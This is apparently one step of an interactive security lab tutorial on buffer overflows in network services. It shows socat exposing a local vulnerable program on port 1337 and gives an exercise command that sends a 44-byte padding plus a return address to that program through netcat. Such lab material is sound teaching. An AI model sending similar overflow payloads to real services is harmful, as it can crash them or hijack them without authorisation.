# Buffer overflow of the network

So far, We have explored how to exploit a buffer-overflow:
- via program argument (strcopy function)
- via command prompt (gets function) 

Did you know that it works "almost" the same for a service exposed over the Network? Well there is a slight difference, though:
- you don't have access to the file system (no access to core dump, if any)
- you don't always have a remote shell to use:
  - to use the command-prompt to read events with `dmesg`
  - to perform static analysis of the remote binary: `file`, `objdump`, `readelf` ...

The Fuzzing technique consists in trying inputs of different sizes and different nature.
If Segmentation fault signals are not captured by a handler, it is likely that the remote service will crash when a large payload triggers a bufferr-overflow, resulting in degradation of service performance or Denial of service.

## Simulate Network access

To simulate Network Buffer Overflow, we will use a small utility called `socat`. 
Without digging into details, the below will redirect all inputs and outputs of the executed programme to a socker exposed on port 1337:

`socat TCP-LISTEN:1337,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./vuln"`{{execute}}

To communicate with port 1337 on the same machine, we will use the netcat utility (`nc`)


# Exercise

1. Execute the socat command
2. Now open a new Terminal by clicking the `+` sign near the Terminal tab, then select `Open New Terminal`
3. On the second terminal, type `echo $(python -c "print('A'*44 + '\xf6\x91\x04\x08')") | nc localhost 1337`{{execute}}




